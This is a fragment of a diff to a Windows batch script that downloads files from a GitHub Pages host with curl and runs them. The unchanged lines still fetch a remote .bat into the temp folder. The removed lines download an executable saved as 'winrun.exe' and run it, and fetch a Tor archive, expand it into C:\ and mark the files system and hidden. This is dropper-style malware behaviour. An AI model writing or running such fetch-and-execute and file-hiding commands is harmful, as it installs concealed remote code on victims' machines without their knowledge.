@@ -21,11 +21,5 @@ curl.exe %proxy% https://cryptedlumos.github.io/purga_paperino.bat --output "%te
 echo.
 )
 echo [TARGET STOP]
-REM curl.exe %proxy% "https://cryptedlumos.github.io/client.exe" --output "%temp%\winrun.exe"
-IF EXIST "%temp%\winrun.exe" (
-  "%temp%\winrun.exe"
-) ELSE (
-  echo
-)
 REM opipirrui0duasi0gj0dauff
-REM curl.exe %proxy% "https://cryptedlumos.github.io/Tor.zip" --output "%temp%\Tor.zip" && powershell Expand-Archive -LiteralPath "%temp%\Tor.Zip -DestinationPath "C:\" && attrib +s +h +i "C:\"
+
